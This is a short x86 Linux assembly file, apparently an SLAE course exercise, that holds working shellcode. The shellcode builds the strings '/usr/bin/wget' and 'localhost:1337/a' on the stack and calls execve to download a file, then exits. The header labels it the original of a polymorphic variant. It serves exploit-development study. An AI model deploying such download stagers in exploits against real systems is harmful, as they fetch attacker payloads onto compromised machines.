# Dissection - download file, original version
# Paw Petersen, SLAE-656
# https://www.pawpetersen.dk/slae-assignment-6c-polymorphic-shellcode-download-file-linux-x86/

global _start
section .text
_start:
  push  0xb
  pop   eax
  cdq  
  push  edx
  
  ;localhost:1337/a
  push  0x612f3733  ; a/73
  push  0x33313a74  ; 31:t
  push  0x736f686c  ; sohl
  push  0x61636f6c  ; acol

  mov   ecx,esp
  push  edx

  push  0x74        ; t
  push  0x6567772f  ; egw/
  push  0x6e69622f  ; nib/
  push  0x7273752f  ; rsu/

  mov   ebx,esp
  push  edx
  push  ecx
  push  ebx
  mov   ecx,esp
  int   0x80
  inc   eax
  int   0x80
